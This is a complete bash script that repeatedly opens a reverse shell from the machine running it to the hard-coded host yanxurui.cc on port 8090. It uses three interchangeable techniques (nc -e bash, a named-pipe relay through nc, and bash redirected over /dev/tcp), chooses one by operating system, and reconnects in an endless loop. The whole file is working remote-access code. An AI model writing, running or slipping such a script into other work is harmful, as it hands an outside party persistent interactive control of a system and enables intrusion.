backshell_nc()
{
    nc yanxurui.cc 8090 -e bash
}

backshell_nc_pipe()
{
    pipe=/tmp/tmp_fifo
    if [ -e $pipe ]
    then
        echo "$pipe exits"
    else
        mkfifo $pipe
    fi

    cat $pipe | /bin/bash 2>&1 | nc yanxurui.cc 8090 > $pipe
}

backshell_tcp()
{
    bash >& /dev/tcp/yanxurui.cc/8090 <&1
}

backshell ()
{
    date

    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        # Linux
        backshell_tcp
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        # Mac OSX
        backshell_nc_pipe
    elif [[ "$OSTYPE" == "cygwin" ]]; then
        # POSIX compatibility layer and Linux environment emulation for Windows
        echo "Todo"
    elif [[ "$OSTYPE" == "msys" ]]; then
        echo "Todo"
        # Lightweight shell and GNU utilities compiled for Windows (part of MinGW)
    elif [[ "$OSTYPE" == "win32" ]]; then
        echo "Todo"
        # I'm not sure this can happen.
    elif [[ "$OSTYPE" == "freebsd"* ]]; then
        echo "Todo"
        # ...
    else
        # Unknown.
        backshell_nc
    fi

    retval=$?

    echo "session ended"

    if [ "$retval" == 0 ]
    then
        echo "exited succussfully"
    else
        # sleep for a while in case nc fails and this loop consmes too much CPU
        # this could happen when the client has not Internet access or the server is not running
        echo "exited unsuccussfully. sleeping..."
        sleep 3
    fi
}

loop()
{
    while true
    do
        backshell
    done
}

loop
